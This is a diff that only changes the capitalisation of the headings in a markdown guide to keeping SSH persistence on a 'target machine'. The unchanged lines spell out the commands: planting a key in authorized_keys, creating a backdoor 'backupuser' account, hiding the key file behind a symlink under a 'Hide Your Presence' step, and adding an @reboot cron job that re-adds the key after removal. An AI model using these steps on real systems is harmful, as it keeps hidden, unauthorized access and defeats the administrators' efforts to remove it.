@@ -1,4 +1,4 @@
-### **STEP 1. GENERATE SSH KEYS**
+### **Step 1. Generate SSH Keys**
 
 1. Generate an SSH key pair on your local machine:
 `ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key`
@@ -6,14 +6,14 @@
 	- `-b 4096`: Specifies the number of bits in the key.
 	- `-f ~/.ssh/persistence_key`: Specifies the file in which to save the key.
 
-### **STEP 2: COPY THE PUBLIC KEY TO THE TARGET MACHINE**
+### **Step 2. Copy the Public Key to the Target Machine**
 
 1.  Copy the public key to the target machine using SSH:
     `ssh-copy-id -i ~/.ssh/persistence_key.pub user@target_machine`
 2.  Alternatively, manually add the public key to the target machine `~/.ssh/authorized_keys` file:  
     `cat ~/.ssh/persistence_key.pub | ssh user@target_machine "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"`
 
-### **STEP 3. ENSURE PROPER PERMISSIONS**
+### **Step 3. Ensure Proper Permissions**
 
 On the target machine, ensure the `.ssh` directory and `authorized_keys` file have the correct permissions:
 
@@ -22,7 +22,7 @@ On the target machine, ensure the `.ssh` directory and `authorized_keys` file ha
 2.  Set the authorized_keys file permissions to 600:  
     `chmod 600 ~/.ssh/authorized_keys`
 
-### **STEP 4. CONFIGURE SSH FOR KEY-BASED AUTHENTICATION**
+### **Step 4. Configure SSH for Key-Based Authentication**
 
 Verify the SSH server configuration on the target machine to ensure key-based authentication is enabled. Edit /etc/ssh/sshd_config:  
 `sudo nano /etc/ssh/sshd_config`
@@ -38,7 +38,7 @@ Verify the SSH server configuration on the target machine to ensure key-based au
     `ssh -i ~/.ssh/persistence_key user@target_machine`
     
 
-### **STEP 5. ESTABLISH A BACKUP SSH USER**
+### **Step 5. Establish a Backup SSH User**
 
 Create a new user on the target machine as a backup entry point:
 
@@ -49,7 +49,7 @@ Create a new user on the target machine as a backup entry point:
 3.  Add your public key to the new user `authorized_keys` file:  
     `ssh-copy-id -i ~/.ssh/persistence_key.pub backupuser@target_machine`
 
-### **STEP 6. HIDE YOUR PRESENCE**
+### **Step 6. Hide Your Presence**
 
 Move the authorized_keys file to a hidden location and create a symbolic link:
 
@@ -63,7 +63,7 @@ Move the authorized_keys file to a hidden location and create a symbolic link:
     `ln -s ~/.config/.ssh/authorized_keys ~/.ssh/authorized_keys`  
 
 
-### **STEP 7. SET UP A CRON JOB FOR PERSISTENCE**
+### **Step 7. Set Up a Cron Job for Persistence**
 
 1.  Create a cron job to ensure your SSH key is re-added if removed:  
     `(crontab -l ; echo "@reboot sleep 60 && cat ~/.config/.ssh/authorized_keys >> ~/.ssh/authorized_keys") | crontab -`
